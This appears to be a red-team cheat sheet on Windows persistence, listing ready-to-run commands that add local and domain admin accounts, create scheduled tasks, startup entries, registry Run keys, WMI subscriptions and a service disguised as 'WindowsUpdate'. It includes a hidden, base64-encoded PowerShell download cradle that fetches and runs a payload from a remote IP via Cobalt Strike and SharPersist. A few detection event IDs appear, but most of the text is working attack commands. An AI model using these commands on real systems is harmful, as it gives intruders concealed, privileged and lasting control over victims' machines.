# Persistence

* [Persistence](#Persistence)
  * [Create account](#create-account) 
    * [Local Account](#local-account-admin) 
    * [Domain Account](#domain-account-admin) 
  * [Task Scheduler](#task-scheduler) 
  * [Startup Folder](#startup-folder) 
  * [Registry AutoRun](#registry-autorun)
  * [COM Hijacks ( Section to Devlope ) ](#com-hijacks)
  * [WMI Event Subscriptions](#wmi-event-subscriptions)

## Create account
To detect monitor event 4720: A user account was created.
### Local Account Admin
Adversaries may create a local account to maintain access to victim systems. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

```
net user /add [*username] [password]
net localgroup administrators [username] /add
// Command to Cleanup
net user /del "#{username}" >nul 2>&1
```
### Domain Account Admin
Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. 
```
net user username password /ADD /DOMAIN 
net group "Domain Admins" username /add /domain
// Command to Cleanup
net user username >nul 2>&1 /del /domain
```
## Task Scheduler
Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.
```
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
// Cleanup
schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
```
Using tool like SharPersist: 
```
In linux:

strs="IEX ((new-object net.webclient).downloadstring('http://10.8.5.6:80/a'))" 
echo -en $strs | iconv -t UTF-16LE | base64 -w 0
```
In cobalt strike:
``` 
execute-assembly SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc QBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgA4AC4ANQAuADYAOgA4ADAALwBhACcAKQApAA==" -n "Updater" -m add -o logon
```
 * -t is the desired persistance technique.
 * -c is the command to execute.
 * -a are any argement for that command.
 * -n is the name of the task.
 * -m is to add the task
 * -o is the task freqency (```hourly```, ```daily```, ```logon```)

https://github.com/mandiant/SharPersist

https://atomicredteam.io/privilege-escalation/T1053.005/

## Startup Folder
Adversaries may achieve persistence by adding a program to a startup folder. Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.

The startup folder path for the current user is: 

```C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup ```

The startup folder path for all users is: 

```C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp ```

Using tool like SharPersist:

```SharPersist.exe -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add```
 * -f is the filename to save as.


![This is an image](https://github.com/d3vUs3r/Pentest/blob/main/assets/images/Sharpersist.png)

https://github.com/mandiant/SharPersist

## Registry AutoRun

Use Run or RunOnce registry keys to make a program run when a user logs on. The Run key makes the program run every time the user logs on, while the RunOnce key makes the program run one time, and then the key is deleted. These keys can be set for the user or the machine.
The Windows registry includes the following four Run and RunOnce keys:
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce 
```
#{command_to_execute} = C:\Path\Beacon.exe

```
Run with command prompt:
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Register Name" /t REG_SZ /F /D "#{command_to_execute}"
To Cleanup:
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Register Name" /f >nul 2>&1
```
Using tools like SharPersist:
```
SharPersist.exe -t reg -c "C:\path\to\executable.exe" -a "/q /n" -k "hkcurun" -v "updater" -m add
```
 * -k is the registry key to modify.
 * -v is the name of the registry key to create.

https://atomicredteam.io/privilege-escalation/T1547.001/

https://github.com/mandiant/SharPersist

https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys

## WMI Event Subscriptions
Windows Management Instrumentation (WMI) enables system administrators to perform tasks locally and remotely. Run from an administrator powershell window. After running, reboot the victim machine payload running as SYSTEM.

Using [WMI-Persistence](https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1) Powershell script that can create and event filter that will execute a PowerShell based payload from a remote location within 5 minutes after every reboot. 

```
ps> Import-Module .\WMI-Persistence.ps1
ps> Install-Persistence
ps> Ckeck-WMI
```

In this attack 3 event logs will be logged:

```Event ID 19```: WmiEvent (WmiEventFilter activity detected) When a WMI event filter is registered, which is a method used by malware to execute, this event logs the WMI namespace, filter name and filter expression.

```Event ID 20```: WmiEvent (WmiEventConsumer activity detected) This event logs the registration of WMI consumers, recording the consumer name, log, and destination.

```Event ID 21```: WmiEvent (WmiEventConsumerToFilter activity detected) When a consumer binds to a filter, this event logs the consumer name and filter path.

https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/

https://blog.inspired-sec.com/archive/2017/01/20/WMI-Persistence.html

https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96

## Windows Service Installation
Windows services ran with the highest privilege, NT AUTHORITY\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.
```
sc create WindowsUpdate binPath= C:\Windows\Temp\svchost.exe start= auto obj= LocalSystem DisplayName= windowsupdate
```


## COM Hijacks

( Section to Devlope )

